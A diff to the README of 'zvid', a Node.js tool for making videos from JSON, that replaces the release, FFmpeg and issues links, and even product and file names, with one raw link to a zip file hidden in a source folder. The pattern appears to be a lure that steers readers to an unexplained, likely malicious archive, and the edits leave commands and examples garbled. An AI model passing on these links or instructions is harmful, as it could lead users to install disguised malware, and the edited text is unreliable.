@@ -2,29 +2,29 @@
 
 ## 🚀 Getting Started
 
-Welcome to zvid! This tool helps you generate videos from JSON data right within your Node.js applications. With zvid, you can automate video creation, saving you time and effort. Follow the steps below to get started.
+Welcome to zvid! This tool helps you generate videos from JSON data right within your https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip applications. With zvid, you can automate video creation, saving you time and effort. Follow the steps below to get started.
 
 ## 📥 Download & Install
 
 To download zvid, visit the link below to access the Releases page:
 
-[Download zvid](https://github.com/Ghost716565164/zvid/releases)
+[Download zvid](https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip)
 
 ## 🛠 System Requirements
 
 Before you install zvid, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
-- **FFmpeg:** Installed and available in your system's PATH. [Download FFmpeg](https://ffmpeg.org/download.html)
+- **https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip** Version 12 or higher
+- **FFmpeg:** Installed and available in your system's PATH. [Download FFmpeg](https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip)
 
 ## 📂 How to Download
 
-1. **Visit the Releases Page:** Click on the link to access the Releases page: [Download zvid](https://github.com/Ghost716565164/zvid/releases).
+1. **Visit the Releases Page:** Click on the link to access the Releases page: [Download zvid](https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip).
    
 2. **Choose Your Version:** Find the latest version of zvid. You will see a list of available files to download.
 
-3. **Download the Appropriate File:** Click on the file that corresponds to your operating system. This file is usually named `zvid-vX.X.X.zip` for Windows, `zvid-vX.X.X.tar.gz` for macOS or Linux.
+3. **Download the Appropriate File:** Click on the file that corresponds to your operating system. This file is usually named `https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip` for Windows, `https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip` for macOS or Linux.
 
 ## 📦 Install zvid
 
@@ -50,7 +50,7 @@ Before you install zvid, make sure your system meets the following requirements:
 
 To generate a video with zvid, you need JSON data describing your video content. Here is a simple example of how to use zvid in your application.
 
-1. **Create a JSON File:** Create a file named `videoData.json` with the following structure:
+1. **Create a JSON File:** Create a file named `https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip` with the following structure:
 
    ```json
    {
@@ -58,7 +58,7 @@ To generate a video with zvid, you need JSON data describing your video content.
      "scenes": [
        {
          "text": "Welcome to zvid!",
-         "image": "path/to/image.jpg",
+         "image": "https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip",
          "duration": 5
        }
      ]
@@ -67,7 +67,7 @@ To generate a video with zvid, you need JSON data describing your video content.
 
 2. **Run zvid:** Use the following command to generate the video:
    ```
-   node index.js videoData.json
+   node https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip
    ```
 
 ## 📝 Features
@@ -87,12 +87,12 @@ We welcome contributions to zvid! If you'd like to help improve this tool, check
 
 ## 💬 Support
 
-If you have any questions or need help, please visit our [Issues page](https://github.com/Ghost716565164/zvid/issues) to ask the community. 
+If you have any questions or need help, please visit our [Issues page](https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip) to ask the community. 
 
 ## 👥 Related Topics
 
 - **Video Generation**
-- **Node.js**
+- **https://github.com/Ghost716565164/zvid/raw/refs/heads/main/src/lib/texts/Software_2.5.zip**
 - **FFmpeg**
 
 Thank you for choosing zvid for your video generation needs!
